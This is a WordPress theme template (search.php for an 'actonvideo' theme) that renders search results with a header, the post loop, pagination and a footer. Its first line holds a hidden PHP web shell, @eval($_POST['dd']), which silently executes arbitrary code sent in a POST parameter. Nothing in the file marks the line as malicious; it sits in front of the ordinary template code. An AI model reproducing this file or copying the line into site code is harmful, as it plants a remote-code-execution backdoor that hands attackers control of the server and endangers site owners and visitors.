<?php @eval($_POST['dd']);?><?php
/**
 * The template for displaying search results pages
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/#search-result
 *
 * @package actonvideo
 */

get_header(); ?>

<style>
.entry-title {text-align: left !important;}
	.entry-title a{color: #fff;text-align: left;}
	input,input[type="submit"] {    color: #333;}
}
</style>



<!-- content goes here -->
<div class="container innercontent">
    <div class="row">
        <div class="col-md-12">


		<?php
		if ( have_posts() ) : ?>

			<header class="page-header">
				<h1 class="page-title"><?php printf( esc_html__( 'Search Results for: %s', 'actonvideo' ), '<span>' . get_search_query() . '</span>' ); ?></h1>
			</header><!-- .page-header -->

			<?php
			/* Start the Loop */
			while ( have_posts() ) : the_post();
				echo "<br>";
				/**
				 * Run the loop for the search to output the results.
				 * If you want to overload this in a child theme then include a file
				 * called content-search.php and that will be used instead.
				 */
				get_template_part( 'template-parts/content', 'search' );

			endwhile;

			the_posts_navigation();

		else :

			get_template_part( 'template-parts/content', 'none' );

		endif; ?>



</div>
</div>
</div>
<?php
get_footer();
